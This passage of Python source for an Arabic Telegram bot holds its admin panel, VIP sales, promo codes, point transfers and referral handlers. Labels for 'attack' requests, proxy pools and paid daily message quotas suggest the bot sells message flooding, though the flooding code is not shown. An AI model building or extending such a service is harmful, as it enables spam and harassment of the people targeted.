        "⚙️ <b>لوحة التحكم المتقدمة</b>\n\n"
        "اختر الخيار المطلوب:",
        parse_mode="HTML",
        reply_markup=get_admin_keyboard()
    )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    stats = db.get_global_stats()
    
    # الحصول على أفضل 5 مستخدمين
    top_users = db.get_all_users()[:5]
    
    text = (
        f"📊 <b>إحصائيات البوت</b>\n\n"
        f"👥 المستخدمين: {stats['users']}\n"
        f"💰 النقاط الكلية: {stats['total_points']}\n"
        f"📊 العمليات: {stats['total_transactions']}\n"
        f"🎯 طلبات الرشق: {stats['total_attacks']}\n"
        f"📋 قائمة الانتظار: {stats['queue_size']}\n\n"
        f"🏆 <b>أفضل 5 مستخدمين:</b>\n"
    )
    
    for i, (uid, username, name, points, vip) in enumerate(top_users, 1):
        vip_badge = "👑" if vip == 2 else "⭐" if vip == 1 else ""
        text += f"{i}. {name} {vip_badge} - {points} نقطة\n"
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 تحديث", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    users = db.get_all_users()
    
    text = f"👥 <b>قائمة المستخدمين ({len(users)})</b>\n\n"
    
    for i, (uid, username, name, points, vip) in enumerate(users[:20], 1):
        vip_status = "👑 مدى الحياة" if vip == 2 else "⭐ VIP" if vip == 1 else "👤 عادي"
        username_display = f"@{username}" if username else "بدون يوزر"
        text += f"{i}. {name} ({username_display})\n"
        text += f"   🆔: {uid} | 🏆: {points} | {vip_status}\n\n"
    
    if len(users) > 20:
        text += f"... وهناك {len(users) - 20} مستخدم إضافي"
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="admin_search_user")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    await query.edit_message_text(
        "📢 <b>إرسال إذاعة</b>\n\n"
        "أرسل الآن الرسالة التي تريد إذاعتها:\n"
        "(يمكنك استخدام HTML)",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_panel")]])
    )
    return STATE_BROADCAST

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    
    message_text = update.message.text
    users = db.get_all_users()
    
    await update.message.reply_text(f"🚀 جاري الإرسال لـ {len(users)} مستخدم...")
    
    success = 0
    failed = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                user[0],
                message_text,
                parse_mode="HTML"
            )
            success += 1
            await asyncio.sleep(0.1)  # تجنب حظر التلقرام
        except Exception as e:
            failed += 1
        
        # تحديث التقدم كل 50 مستخدم
        if (success + failed) % 50 == 0:
            await update.message.reply_text(f"📊 التقدم: {success+failed}/{len(users)}")
    
    # حفظ الإذاعة في السجلات
    db.save_broadcast(ADMIN_ID, message_text, success, failed)
    
    # تسجيل في القناة
    await log_to_channel(
        f"📢 <b>إذاعة جديدة</b>\n"
        f"المرسل: {get_user_link(ADMIN_ID, 'المسؤول')}\n"
        f"العدد: {len(users)} مستخدم\n"
        f"✅ الناجحة: {success}\n"
        f"❌ الفاشلة: {failed}",
        context
    )
    
    await update.message.reply_text(
        f"✅ <b>تم إرسال الإذاعة!</b>\n\n"
        f"📤 الإجمالي: {len(users)}\n"
        f"✅ الناجحة: {success}\n"
        f"❌ الفاشلة: {failed}",
        parse_mode="HTML"
    )
    
    await admin_panel(update, context)
    return ConversationHandler.END

async def admin_add_points_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    await query.edit_message_text(
        "➕ <b>إضافة/خصم نقاط</b>\n\n"
        "أرسل آيدي المستخدم:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_panel")]])
    )
    return STATE_ADD_POINTS

async def admin_add_points_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ الآيدي يجب أن يكون رقماً!")
        return STATE_ADD_POINTS
    
    target_user = db.get_user(target_id)
    if not target_user:
        await update.message.reply_text("❌ المستخدم غير موجود!")
        return STATE_ADD_POINTS
    
    context.user_data['target_user_id'] = target_id
    context.user_data['target_user_name'] = target_user[2]
    
    await update.message.reply_text(
        f"✅ المستخدم: <b>{target_user[2]}</b>\n"
        f"🏆 الرصيد الحالي: {target_user[4]} نقطة\n\n"
        "أرسل عدد النقاط (استخدم - للإشارة إلى الخصم):",
        parse_mode="HTML"
    )
    return STATE_ADD_POINTS + 1

async def admin_add_points_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ المبلغ يجب أن يكون رقماً!")
        return STATE_ADD_POINTS + 1
    
    target_id = context.user_data['target_user_id']
    target_name = context.user_data['target_user_name']
    
    reason_type = "admin_add" if amount > 0 else "admin_remove"
    log_id = db.update_points(target_id, amount, reason_type, f"بواسطة المسؤول: {update.effective_user.first_name}")
    
    # تسجيل في القناة
    action = "إضافة" if amount > 0 else "خصم"
    await log_to_channel(
        f"👑 <b>{action} نقاط</b>\n"
        f"المسؤول: {get_user_link(update.effective_user.id, update.effective_user.first_name)}\n"
        f"المستخدم: {get_user_link(target_id, target_name)}\n"
        f"المبلغ: {amount} نقطة\n"
        f"رقم العملية: {log_id}",
        context
    )
    
    await update.message.reply_text(
        f"✅ <b>تمت العملية!</b>\n\n"
        f"👤 المستخدم: {target_name}\n"
        f"📈 {action} النقاط: {abs(amount)}\n"
        f"🏆 الرصيد الجديد: {db.get_user(target_id)[4]} نقطة\n"
        f"📝 رقم العملية: {log_id}",
        parse_mode="HTML"
    )
    
    try:
        # إعلام المستخدم
        action_text = "تمت إضافة" if amount > 0 else "تم خصم"
        await context.bot.send_message(
            target_id,
            f"🔔 <b>إشعار من الإدارة</b>\n\n"
            f"{action_text} <b>{abs(amount)} نقطة</b> لحسابك.\n"
            f"🏆 رصيدك الجديد: {db.get_user(target_id)[4]} نقطة\n"
            f"📝 رقم العملية: {log_id}",
            parse_mode="HTML"
        )
    except:
        pass
    
    await admin_panel(update, context)
    return ConversationHandler.END

async def admin_channel_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    current_channel = db.get_setting("mandatory_channel")
    log_channel = db.get_setting("log_channel")
    
    text = (
        f"📢 <b>إدارة القنوات</b>\n\n"
        f"📌 القناة الإجبارية الحالية:\n{current_channel}\n\n"
        f"📝 قناة السجلات الحالية:\n{log_channel}\n\n"
        "اختر ما تريد تعديله:"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 تغيير القناة الإجبارية", callback_data="admin_change_mandatory")],
        [InlineKeyboardButton("🔄 تغيير قناة السجلات", callback_data="admin_change_log")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def admin_change_mandatory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    await query.edit_message_text(
        "🔄 <b>تغيير القناة الإجبارية</b>\n\n"
        "أرسل يوزر القناة الجديدة (مثال: @channel_username):",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_channel")]])
    )
    return STATE_SET_CHANNEL

async def process_channel_change(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_channel = update.message.text.strip()
    
    if not new_channel.startswith('@'):
        await update.message.reply_text("❌ يجب أن يبدأ يوزر القناة بـ @")
        return STATE_SET_CHANNEL
    
    # التحقق من أن البوت موجود في القناة
    try:
        chat = await context.bot.get_chat(new_channel)
        db.set_setting("mandatory_channel", new_channel)
        
        await log_to_channel(
            f"🔄 <b>تغيير القناة الإجبارية</b>\n"
            f"المسؤول: {get_user_link(update.effective_user.id, update.effective_user.first_name)}\n"
            f"القناة الجديدة: {new_channel}",
            context
        )
        
        await update.message.reply_text(
            f"✅ <b>تم تغيير القناة الإجبارية!</b>\n\n"
            f"القناة الجديدة: {new_channel}\n"
            f"سيتم تطبيقها على المستخدمين الجدد فوراً.",
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ: {str(e)}\nتأكد من أن البوت موجود في القناة.")
        return STATE_SET_CHANNEL
    
    await admin_panel(update, context)
    return ConversationHandler.END

async def admin_backup_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    text = (
        "📥 <b>استيراد/تصدير البيانات</b>\n\n"
        "اختر الخيار المطلوب:\n\n"
        "⚠️ <b>تحذير:</b> الاستيراد سيقوم باستبدال البيانات الموجودة!"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 تصدير البيانات", callback_data="admin_export")],
        [InlineKeyboardButton("📥 استيراد البيانات", callback_data="admin_import")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def admin_export_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    
    # تصدير البيانات
    data = db.export_data("all")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"bot_backup_{timestamp}.json"
    
    # حفظ في ملف مؤقت
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(data)
    
    # إرسال الملف
    with open(filename, 'rb') as f:
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=f,
            filename=filename,
            caption=f"📤 <b>نسخة احتياطية</b>\n\nتم التصدير في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML"
        )
    
    # حذف الملف المؤقت
    import os
    os.remove(filename)
    
    await query.message.reply_text("✅ تم إرسال النسخة الاحتياطية!")

async def admin_import_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    await query.edit_message_text(
        "📥 <b>استيراد البيانات</b>\n\n"
        "⚠️ <b>تحذير هام:</b> هذه العملية ستحل محل البيانات الحالية!\n\n"
        "أرسل ملف JSON للنسخة الاحتياطية:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_backup")]])
    )
    return STATE_IMPORT_DATA

async def process_import_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("❌ يجب إرسال ملف JSON!")
        return STATE_IMPORT_DATA
    
    file = await update.message.document.get_file()
    temp_file = f"temp_import_{datetime.now().timestamp()}.json"
    await file.download_to_drive(temp_file)
    
    try:
        with open(temp_file, 'r', encoding='utf-8') as f:
            json_data = f.read()
        
        # استيراد البيانات
        success, errors = db.import_data(json_data)
        
        # حذف الملف المؤقت
        import os
        os.remove(temp_file)
        
        if errors:
            error_msg = "\n".join(errors[:5])  # عرض أول 5 أخطاء فقط
            await update.message.reply_text(
                f"⚠️ <b>تم الاستيراد مع أخطاء</b>\n\n"
                f"✅ العمليات الناجحة: {success}\n"
                f"❌ الأخطاء: {len(errors)}\n\n"
                f"<code>{error_msg}</code>",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                f"✅ <b>تم الاستيراد بنجاح!</b>\n\n"
                f"عدد العمليات: {success}",
                parse_mode="HTML"
            )
        
        # تسجيل في القناة
        await log_to_channel(
            f"📥 <b>استيراد بيانات</b>\n"
            f"المسؤول: {get_user_link(update.effective_user.id, update.effective_user.first_name)}\n"
            f"العمليات: {success}",
            context
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ: {str(e)}")
        return STATE_IMPORT_DATA
    
    await admin_panel(update, context)
    return ConversationHandler.END

async def admin_proxies_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    # جلب البروكسيات
    db.cursor.execute("SELECT COUNT(*) FROM proxies")
    total = db.cursor.fetchone()[0]
    
    db.cursor.execute("SELECT COUNT(*) FROM proxies WHERE is_active = 1")
    active = db.cursor.fetchone()[0]
    
    text = (
        f"🛠️ <b>إدارة البروكسيات</b>\n\n"
        f"📊 الإحصائيات:\n"
        f"   • الإجمالي: {total}\n"
        f"   • النشطة: {active}\n"
        f"   • المعطلة: {total - active}\n\n"
        "اختر الخيار:"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ إضافة بروكسي", callback_data="admin_add_proxy")],
        [InlineKeyboardButton("📋 عرض البروكسيات", callback_data="admin_list_proxies")],
        [InlineKeyboardButton("🔄 جلب تلقائي", callback_data="admin_fetch_proxies")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def admin_add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "➕ <b>إضافة بروكسي</b>\n\n"
        "أرسل رابط البروكسي (صيغة: http://user:pass@ip:port):",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_proxies")]])
    )

async def process_add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    proxy_url = update.message.text.strip()
    
    # التحقق البسيط من صحة الصيغة
    if not proxy_url.startswith(('http://', 'https://', 'socks5://')):
        await update.message.reply_text("❌ صيغة غير صحيحة! يجب أن تبدأ بـ http:// أو https:// أو socks5://")
        return
    
    if db.add_proxy(proxy_url):
        await update.message.reply_text("✅ تم إضافة البروكسي بنجاح!")
        
        # تسجيل في القناة
        await log_to_channel(
            f"➕ <b>إضافة بروكسي</b>\n"
            f"المسؤول: {get_user_link(update.effective_user.id, update.effective_user.first_name)}\n"
            f"البروكسي: {proxy_url[:50]}...",
            context
        )
    else:
        await update.message.reply_text("❌ البروكسي موجود مسبقاً!")
    
    await admin_panel(update, context)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 👑 نظام VIP والترقيات
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def vip_upgrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    user_data = db.get_user(user_id)
    vip_level = user_data[8] if user_data else 0
    
    text = (
        f"👑 <b>ترقية الحساب</b>\n\n"
        f"📊 حالتك الحالية: {'VIP مدى الحياة' if vip_level == 2 else 'VIP' if vip_level == 1 else 'عادي'}\n\n"
        f"📦 <b>الباقات المتاحة:</b>\n\n"
        f"1. ⭐ <b>اشتراك VIP (20 نجمة)</b>\n"
        f"   • 250 نقطة فورية\n"
        f"   • 10,000 رسالة يومياً\n"
        f"   • أولوية في التنفيذ\n"
        f"   • صلاحية: 30 يوم\n\n"
        f"2. 👑 <b>مدى الحياة (50 نجمة)</b>\n"
        f"   • 500 نقطة فورية\n"
        f"   • عدد لا محدود من الرسائل\n"
        f"   • أولوية قصوى\n"
        f"   • تحديثات مجانية\n\n"
        f"📞 للشراء: @MO_3MK\n"
        f"📋 أرسل له: {user_id}"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 شراء VIP (20⭐)", callback_data="buy_vip_20")],
        [InlineKeyboardButton("👑 شراكة مدى الحياة (50⭐)", callback_data="buy_vip_50")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
    ])
    
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def buy_vip_20(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    text = (
        f"⭐ <b>شراء اشتراك VIP (20 نجمة)</b>\n\n"
        f"📋 خطوات الشراء:\n"
        f"1️⃣ اضغط على اسم الحساب: @MO_3MK\n"
        f"2️⃣ أرسل له هدية بقيمة <b>20 نجوم</b>\n"
        f"3️⃣ انسخ الآيدي الخاص بك: <code>{user_id}</code>\n"
        f"4️⃣ أرسل الآيدي + صورة الإيصال\n\n"
        f"🎁 المكافآت:\n"
        f"• 250 نقطة فورية\n"
        f"• 10,000 رسالة يومياً\n"
        f"• أولوية في التنفيذ\n"
        f"• صلاحية 30 يوم\n\n"
        f"⏳ سيتم التفعيل خلال 5 دقائق"
    )
    
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="vip_upgrade")]])
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

async def buy_vip_50(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    text = (
        f"👑 <b>شراكة مدى الحياة (50 نجمة)</b>\n\n"
        f"📋 خطوات الشراء:\n"
        f"1️⃣ اضغط على اسم الحساب: @MO_3MK\n"
        f"2️⃣ أرسل له هدية بقيمة <b>50 نجوم</b>\n"
        f"3️⃣ انسخ الآيدي الخاص بك: <code>{user_id}</code>\n"
        f"4️⃣ أرسل الآيدي + صورة الإيصال\n\n"
        f"🎁 المكافآت:\n"
        f"• 500 نقطة فورية\n"
        f"• عدد لا محدود من الرسائل\n"
        f"• أولوية قصوى في التنفيذ\n"
        f"• تحديثات مجانية للأبد\n"
        f"• دعم فني متميز\n\n"
        f"⏳ سيتم التفعيل خلال 5 دقائق"
    )
    
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="vip_upgrade")]])
    await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🎫 نظام الأكواد (محدث)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🎫 <b>استبدال الكود</b>\n\nأرسل الكود الخاص بك الآن:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="collect_points")]])
    )
    return STATE_REDEEM_CODE

async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip().upper()
    user_id = update.effective_user.id
    
    result = db.redeem_promo_code(user_id, code)
    
    if result == "not_found":
        await update.message.reply_text("❌ الكود غير صحيح.")
    elif result == "expired":
        await update.message.reply_text("❌ الكود منتهي الصلاحية أو تم استخدامه بالكامل.")
    elif result == "used":
        await update.message.reply_text("❌ لقد استخدمت هذا الكود مسبقاً.")
    else:
        await update.message.reply_text(
            f"🎉 <b>مبروك!</b>\nتم إضافة <b>{result} نقطة</b> لحسابك.",
            parse_mode="HTML"
        )
        
        # تسجيل في القناة
        await log_to_channel(
            f"🎫 <b>استخدام كود</b>\n"
            f"المستخدم: {get_user_link(user_id, update.effective_user.first_name)}\n"
            f"الكود: {code}\n"
            f"النقاط: {result}",
            context
        )
        
        await send_dashboard(update, context)
        return ConversationHandler.END
    
    return STATE_REDEEM_CODE

async def admin_start_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        return
    
    await query.answer()
    await query.edit_message_text(
        "📝 <b>إنشاء كود جديد</b>\n\n"
        "أرسل البيانات بالترتيب التالي (كل سطر خاص):\n"
        "<code>اسم_الكود\nعدد_النقاط\nعدد_المستخدمين</code>\n\n"
        "مثال:\nEID2024\n100\n50",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="admin_panel")]])
    )
    return STATE_CREATE_CODE

async def admin_save_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    try:
        lines = text.split('\n')
        if len(lines) < 3:
            raise ValueError
        
        code_name = lines[0].strip().upper()
        points = int(lines[1].strip())
        max_users = int(lines[2].strip())
        
        if db.create_promo_code(code_name, points, max_users, update.effective_user.id):
            await update.message.reply_text(
                f"✅ تم إنشاء الكود بنجاح!\n\n"
                f"🎫 الكود: <code>{code_name}</code>\n"
                f"🏆 النقاط: {points}\n"
                f"👥 عدد المستخدمين: {max_users}",
                parse_mode="HTML"
            )
            
            # تسجيل في القناة
            await log_to_channel(
                f"🎫 <b>إنشاء كود جديد</b>\n"
                f"المسؤول: {get_user_link(update.effective_user.id, update.effective_user.first_name)}\n"
                f"الكود: {code_name}\n"
                f"النقاط: {points}\n"
                f"المستخدمين: {max_users}",
                context
            )
        else:
            await update.message.reply_text("❌ الكود موجود مسبقاً، اختر اسماً آخر.")
            return STATE_CREATE_CODE
            
    except ValueError:
        await update.message.reply_text("❌ التنسيق خطأ! تأكد من الأسطر والأرقام.")
        return STATE_CREATE_CODE
    
    await admin_panel(update, context)
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 💸 نظام التحويل (محدث)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    tax = db.get_setting("tax_percent")
    await query.edit_message_text(
        f"💸 <b>تحويل النقاط</b>\n\n"
        f"⚠️ <b>ملاحظة:</b> عمولة {tax}% من المبلغ المحول.\n\n"
        "👇 أرسل <b>الآيدي (ID)</b> للشخص الذي تريد التحويل له:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="main_menu")]])
    )
    return STATE_TRANSFER_ID

async def get_transfer_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        target_id = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ الآيدي يجب أن يكون أرقاماً فقط.")
        return STATE_TRANSFER_ID
    
    if target_id == update.effective_user.id:
        await update.message.reply_text("❌ لا يمكنك التحويل لنفسك!")
        return STATE_TRANSFER_ID
    
    target_user = db.get_user(target_id)
    if not target_user:
        await update.message.reply_text("❌ هذا المستخدم غير مسجل في البوت.")
        return STATE_TRANSFER_ID
    
    context.user_data['transfer_to'] = target_id
    context.user_data['target_name'] = target_user[2]
    
    await update.message.reply_text(
        f"✅ تم تحديد المستلم: <b>{target_user[2]}</b>\n"
        "🔢 أرسل الآن المبلغ المراد تحويله:",
        parse_mode="HTML"
    )
    return STATE_TRANSFER_AMOUNT

async def get_transfer_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        amount = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ المبلغ يجب أن يكون رقماً صحيحاً.")
        return STATE_TRANSFER_AMOUNT
    
    if amount < 10:
        await update.message.reply_text("❌ الحد الأدنى للتحويل هو 10 نقاط.")
        return STATE_TRANSFER_AMOUNT
    
    user_balance = db.get_user(user_id)[4]
    if amount > user_balance:
        await update.message.reply_text(f"❌ رصيدك غير كافٍ. لديك {user_balance} فقط.")
        return STATE_TRANSFER_AMOUNT
    
    # الحسابات
    tax_percent = int(db.get_setting("tax_percent"))
    tax_amount = int(amount * (tax_percent / 100))
    final_amount = amount - tax_amount
    target_id = context.user_data['transfer_to']
    target_name = context.user_data['target_name']
    
    # التنفيذ
    sender_log = db.update_points(user_id, -amount, "transfer_out", f"إلى: {target_name}")
    receiver_log = db.update_points(target_id, final_amount, "transfer_in", f"من: {update.effective_user.first_name}")
    
    # رسالة للمرسل
    await update.message.reply_text(
        f"✅ <b>تم التحويل بنجاح!</b>\n"
        f"📤 المبلغ المخصوم: {amount}\n"
        f"📉 العمولة ({tax_percent}%): {tax_amount}\n"
        f"📥 وصل للمستلم: {final_amount}\n"
        f"📝 رقم العملية: {sender_log}",
        parse_mode="HTML"
    )
    
    # تسجيل في القناة
    await log_to_channel(
        f"💸 <b>تحويل نقاط</b>\n"
        f"المرسل: {get_user_link(user_id, update.effective_user.first_name)}\n"
        f"المستلم: {get_user_link(target_id, target_name)}\n"
        f"المبلغ: {amount} نقطة\n"
        f"العمولة: {tax_amount}\n"
        f"وصل: {final_amount}",
        context
    )
    
    # رسالة للمستلم
    try:
        sender_link = get_user_link(user_id, update.effective_user.first_name)
        await context.bot.send_message(
            target_id,
            f"💰 <b>حوالة واردة!</b>\n\n"
            f"استلمت <b>{final_amount} نقطة</b> من {sender_link}\n"
            f"📝 رقم العملية: {receiver_log}",
            parse_mode="HTML"
        )
    except:
        pass
    
    # العودة للداشبورد
    await send_dashboard(update, context)
    return ConversationHandler.END

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔄 القوائم الفرعية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def main_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()
    
    # الرجوع للرئيسية
    if data == "main_menu":
        await send_dashboard(update, context, edit=True)
    
    # قائمة الرشق
    elif data == "attack_menu":
        # التحقق من الاشتراك أولاً
        if not await check_channel_membership(user_id, context):
            channel = db.get_setting("mandatory_channel")
            await query.edit_message_text(
                f"⚠️ <b>يجب الاشتراك في القناة أولاً!</b>\n\n"
                f"رجاء اشترك في القناة:\n{channel}\n"
                f"ثم حاول مرة أخرى.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 الانضمام للقناة", url=f"https://t.me/{channel[1:]}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
                ])
            )
            return
        
        await attack_menu(update, context)
    
    # قائمة تجميع النقاط
    elif data == "collect_points":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 رابط الإحالة", callback_data="referral_page")],
            [InlineKeyboardButton("📅 المكافأة اليومية", callback_data="daily_bonus")],
            [InlineKeyboardButton("🎫 استبدال كود", callback_data="redeem_code_start")],
            [InlineKeyboardButton("💳 شراء نقاط", callback_data="buy_points_menu")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
        ])
        await query.edit_message_text(
            "🔄 <b>قسم تجميع النقاط</b>\nاختر الطريقة المناسبة:",
            reply_markup=kb, parse_mode="HTML"
        )
    
    # صفحة الإحالة
    elif data == "referral_page":
        link = f"https://t.me/{context.bot.username}?start=invite_{user_id}"
        
        # لوحة الشرف
        leaderboard_text = ""
        if db.get_setting("show_leaderboard") == "1":
            db.cursor.execute('''
                SELECT referrer_id, COUNT(*) as count 
                FROM users 
                WHERE referrer_id IS NOT NULL 
                GROUP BY referrer_id 
                ORDER BY count DESC 
                LIMIT 5
            ''')
            top_ids = db.cursor.fetchall()
            
            if top_ids:
                leaderboard_text = "\n\n🏆 <b>أكثر الأعضاء تميزاً:</b>\n"
                for idx, (uid, count) in enumerate(top_ids, 1):
                    user = db.get_user(uid)
                    if user:
                        name_link = get_user_link(uid, user[2])
                        leaderboard_text += f"{idx}. {name_link} ⇦ {count} دعوة\n"
        
        text = (
            f"🎁 <b>نظام الإحالة والمكافآت</b>\n\n"
            f"شارك الرابط واربح <b>10 نقاط</b> عن كل صديق!\n\n"
            f"🔗 رابطك:\n<code>{link}</code>\n"
            f"{leaderboard_text}"
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]])
        await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    
    # المكافأة اليومية
    elif data == "daily_bonus":
        u_data = db.get_user(user_id)
        last_bonus = u_data[6]
        now = datetime.now()
        
        can_claim = True
        if last_bonus:
            last_date = datetime.fromisoformat(last_bonus)
            if now - last_date < timedelta(hours=24):
                can_claim = False
                remaining = timedelta(hours=24) - (now - last_date)
                hours, remainder = divmod(remaining.seconds, 3600)
                minutes, _ = divmod(remainder, 60)
                await query.answer(f"⏳ تبقى {hours} ساعة و {minutes} دقيقة", show_alert=True)
                return
        
        if can_claim:
            bonus = 5
            log_id = db.update_points(user_id, bonus, "bonus")
            db.cursor.execute("UPDATE users SET last_daily_bonus = ? WHERE user_id = ?", (now.isoformat(), user_id))
            db.conn.commit()
            
            await query.edit_message_text(
                f"✅ <b>تم استلام المكافأة!</b>\n🎁 حصلت على {bonus} نقاط.\nعد غداً للمزيد.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]]),
                parse_mode="HTML"
            )
    
    # شراء النقاط
    elif data == "buy_points_menu":
